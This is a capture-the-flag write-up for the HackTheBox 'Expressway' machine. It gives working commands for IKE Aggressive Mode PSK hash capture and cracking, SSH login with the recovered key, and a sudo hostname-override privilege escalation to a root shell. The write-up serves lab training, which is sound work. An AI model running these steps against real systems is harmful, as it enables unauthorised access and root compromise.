# HackTheBox: Expressway Write-up

> Hack The Box / CTF write-up  
> Flag values have been intentionally removed.

## Enumeration

I first checked the IKE service on `expressway.htb`. The Main Mode probe received a response. Switching to Aggressive Mode exposed the identity `ike@expressway.htb` and a PSK hash that could be cracked offline.

    sudo ike-scan expressway.htb
    sudo ike-scan -A expressway.htb
    sudo ike-scan -A expressway.htb --id=ike@expressway.htb -Pike.psk

The Aggressive Mode response included:

    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    Hash(20 bytes)

After extracting the PSK and decompressing the RockYou wordlist, `psk-crack` recovered the key `freakingrockstarontheroad`.

## Initial Foothold

I used the identity from the IKE exchange and the recovered PSK to connect over SSH as `ike`. The user flag was available in the home directory; its value is omitted.

    ssh ike@expressway.htb
    ike@expressway:~$ cat user.txt

## Privilege Escalation

The local sudo policy did not grant `ike` access. The Squid access log was readable from the foothold account and contained a request for `offramp.expressway.htb`:

    sudo -l
    Sorry, user ike may not run sudo on expressway.

    cat /var/log/squid/access.log.1
    ... GET http://offramp.expressway.htb ...

I ran the installed sudo binary with the logged hostname. From `/usr/bin`, `./bash` started a root shell. The root flag was available there; its value is omitted.

    cd /usr/bin
    /usr/local/bin/sudo -h offramp.expressway.htb ./bash
    root@expressway:/usr/bin# id
    uid=0(root) gid=0(root) groups=0(root)
    root@expressway:/usr/bin# cat /root/root.txt

## Attack Path

    IKE Aggressive Mode
      -> PSK recovery
      -> SSH as ike
      -> Squid access log
      -> offramp.expressway.htb
      -> sudo host override
      -> root

